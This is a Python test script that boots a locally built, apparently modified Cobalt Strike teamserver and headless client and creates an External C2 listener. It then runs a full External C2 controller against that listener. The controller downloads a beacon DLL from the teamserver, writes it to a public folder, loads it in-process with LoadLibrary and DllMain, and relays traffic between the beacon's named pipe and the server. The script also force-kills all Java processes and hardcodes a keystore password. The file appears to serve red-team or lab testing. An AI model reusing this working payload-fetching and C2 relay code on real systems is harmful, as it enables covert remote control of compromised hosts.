# -*- coding: utf-8 -*-
"""extc2_lineB_test.py - full line-B reproduction on a fresh local TS:
start TS + headless client, create the extc2 listener, then run the
proven line-A controller (rewritten parameterless below) against it.
Outcome discriminates: bake-broken (abort) vs controller/official-inject
issue (green)."""
import os
import re
import socket
import struct
import subprocess
import sys
import time

import ctypes
import threading

P3 = r"C:\Users\Administrator\Desktop\cobaltstrike\cobaltstrike-ts\p3-llvm-bench"
TSBOOT = P3 + r"\tsboot_run"
LOG = TSBOOT + r"\r1.log"
JDK = r"C:\Users\Administrator\Desktop\jdk-21.0.12.1\bin"
JAR = P3 + r"\build\libs\cs-gradle-4.9.1-SNAPSHOT-all.jar"
PAYLOAD_OUT = r"C:\Users\Public\extc2_payload.dll"
TS_PORT = 2222
PIPENAME_PIPE = r"\\.\pipe\B1ExtC2"
TS_ADDR = ("192.168.100.200", TS_PORT)

subprocess.run(["taskkill", "/IM", "franken_b1.exe", "/F"], capture_output=True)
r = subprocess.run(["powershell", "-NoProfile", "-Command",
                    'Get-CimInstance Win32_Process -Filter "name=\'java.exe\' or name=\'javaw.exe\'" | '
                    'ForEach-Object { "$($_.ProcessId)" }'],
                   capture_output=True, text=True, timeout=60)
for p in [x.strip() for x in r.stdout.split() if x.strip().isdigit()]:
    subprocess.run(["taskkill", "/PID", p, "/F"], capture_output=True)
time.sleep(4)
for f in (TSBOOT + r"\r1_inbox.txt", TSBOOT + r"\r1_ack.txt"):
    if os.path.exists(f):
        os.remove(f)

ts = subprocess.Popen([JDK + r"\java.exe",
                       "--add-opens=java.base/sun.net.www.protocol.https=ALL-UNNAMED",
                       "--add-opens=java.base/sun.net.www.protocol.http=ALL-UNNAMED",
                       "--add-opens=java.base/java.net=ALL-UNNAMED",
                       "-Xmx2g", "-XX:+AggressiveHeap", "-XX:+UseParallelGC",
                       "-Djavax.net.ssl.keyStore=cobaltstrike.store",
                       "-Djavax.net.ssl.keyStorePassword=123456",
                       "-cp", JAR, "server.TeamServer", "192.168.100.200", "franken", "r2_inj_tpd.profile"],
                      cwd=TSBOOT)
time.sleep(12)
subprocess.Popen([JDK + r"\javaw.exe",
                  "--add-opens=java.base/sun.net.www.protocol.https=ALL-UNNAMED",
                  "--add-opens=java.base/sun.net.www.protocol.http=ALL-UNNAMED",
                  "--add-opens=java.base/java.net=ALL-UNNAMED",
                  "-Xmx512m", "-cp", JAR,
                  "aggressor.headless.Start", "192.168.100.200", "50050", "franken-opX", "franken",
                  "headless_franken.cna"],
                 cwd=TSBOOT)
deadline = time.time() + 120
while time.time() < deadline:
    if "READY" in open(LOG, encoding="utf-8", errors="replace").read()[-400:]:
        break
    time.sleep(3)
print("ready")
time.sleep(5)

sys.path.insert(0, TSBOOT)
from tier3_common import send

send("extc2_listener_create", "ext_r2", str(TS_PORT), "B1ExtC2")
time.sleep(6)
ok = False
for _ in range(10):
    if subprocess.run(["powershell", "-NoProfile", "-Command",
                       "(Test-NetConnection -ComputerName 127.0.0.1 -Port %d -InformationLevel Quiet -WarningAction SilentlyContinue)" % TS_PORT],
                      capture_output=True, text=True).stdout.strip() == "True":
        ok = True
        break
    time.sleep(2)
print("listener up:", ok)
assert ok

# ---- controller (line-A proven contract) ----
import win32file
import win32pipe

k32 = ctypes.windll.kernel32
k32.LoadLibraryW.restype = ctypes.c_void_p
k32.LoadLibraryW.argtypes = [ctypes.c_wchar_p]
HEARTBEAT = b"\x00"


def ts_send(sock, data):
    sock.sendall(struct.pack("<I", len(data)) + data)


def ts_recv(sock, timeout=90):
    sock.settimeout(timeout)
    hdr = b""
    while len(hdr) < 4:
        c = sock.recv(4 - len(hdr))
        if not c:
            raise EOFError("TS closed")
        hdr += c
    (n,) = struct.unpack("<I", hdr)
    buf = b""
    while len(buf) < n:
        c = sock.recv(n - len(buf))
        if not c:
            raise EOFError("TS closed mid-frame")
        buf += c
    return buf


def load_beacon(path):
    h = k32.LoadLibraryW(path)
    if not h:
        raise OSError("LoadLibrary failed")
    base = h

    def rd(off, n):
        return ctypes.string_at(base + off, n)

    e = struct.unpack_from("<I", rd(0x3C, 4))[0]
    entry_rva = struct.unpack_from("<I", rd(e + 24 + 0x10, 4))[0]
    entry = ctypes.WINFUNCTYPE(ctypes.c_int, ctypes.c_void_p, ctypes.c_uint,
                               ctypes.c_void_p)(base + entry_rva)
    threading.Thread(target=lambda: entry(base, 4, None), daemon=True).start()
    print("[load] base=0x%X DllMain(4) entry=+0x%X" % (base, entry_rva), flush=True)


def pipe_connect(name, timeout_s=90):
    deadline = time.time() + timeout_s
    while True:
        try:
            h = win32file.CreateFile(
                name, win32file.GENERIC_READ | win32file.GENERIC_WRITE,
                0, None, win32file.OPEN_EXISTING, 0, None)
            win32pipe.SetNamedPipeHandleState(
                h, win32pipe.PIPE_READMODE_MESSAGE, None, None)
            return h
        except win32file.error:
            if time.time() >= deadline:
                raise OSError("pipe never appeared: " + name)
            time.sleep(0.3)


def pipe_write_task(handle, frame):
    win32file.WriteFile(handle, struct.pack("<I", len(frame)))
    if frame:
        win32file.WriteFile(handle, frame)


def pipe_read_unit(handle):
    hr, msg = win32file.ReadFile(handle, 1 << 20)
    if not msg:
        raise EOFError("beacon pipe closed")
    if msg == HEARTBEAT:
        return HEARTBEAT
    if len(msg) != 4:
        raise EOFError("unexpected mid-frame message %dB" % len(msg))
    (n,) = struct.unpack("<I", msg)
    if n == 0:
        return b""
    payload = b""
    while len(payload) < n:
        hr, chunk = win32file.ReadFile(handle, 1 << 20)
        if not chunk:
            raise EOFError("beacon pipe closed mid-payload")
        payload += chunk
    return payload


def pipe_peek_unit(handle, wait_s=0.4):
    deadline = time.time() + wait_s
    while time.time() < deadline:
        ok, avail, left = win32pipe.PeekNamedPipe(handle, 1)
        if avail:
            return pipe_read_unit(handle)
        time.sleep(0.02)
    return None


def main():
    s = socket.create_connection(TS_ADDR, timeout=10)
    print("[ts] connected", flush=True)
    ts_send(s, b"arch=x64")
    ts_send(s, b"pipename=B1ExtC2")
    ts_send(s, b"go")
    print("[ts] options sent", flush=True)
    payload = ts_recv(s, timeout=30)
    print("[ts] payload %dB head=%r" % (len(payload), payload[:2]), flush=True)
    if payload[:2] != b"MZ":
        print("[ts] unexpected head:", payload[:64].hex(), flush=True)
        return
    open(PAYLOAD_OUT, "wb").write(payload)
    import hashlib
    # does the baked stage still equal the raw CI dll (unbaked)?
    raw = open(r"C:\Users\Public\extc2_test\extc2.x64.dll", "rb").read()
    same = payload == raw
    print("[bake] stage == raw CI dll:", same, "sha_stage=%s" %
          hashlib.sha256(payload).hexdigest()[:12], flush=True)

    load_beacon(PAYLOAD_OUT)
    ph = pipe_connect(PIPENAME_PIPE, 30)
    print("[pipe] connected (message mode)", flush=True)

    meta = pipe_read_unit(ph)
    print("[relay] metadata %dB -> ts" % len(meta), flush=True)
    ts_send(s, meta)

    n = 0
    t0 = time.time()
    registered = False
    while time.time() - t0 < 120:
        try:
            tframe = ts_recv(s, timeout=20)
        except socket.timeout:
            print("[ts] recv timeout (no dump?)", flush=True)
            continue
        except (EOFError, OSError) as e:
            print("[relay] TS ended: %s" % e, flush=True)
            return
        n += 1
        if len(tframe) > 1:
            print("[relay] #%d ts->beacon %dB head=%s" % (n, len(tframe), tframe[:16].hex()), flush=True)
        pipe_write_task(ph, tframe)
        while True:
            unit = pipe_peek_unit(ph, wait_s=0.4)
            if unit is None:
                break
            if unit == HEARTBEAT:
                ts_send(s, unit)
                break
            print("[relay] #%d beacon->ts %dB head=%s" % (n, len(unit), unit[:16].hex()), flush=True)
            ts_send(s, unit)
    print("RELAY DONE frames=%d" % n, flush=True)


if __name__ == "__main__":
    main()
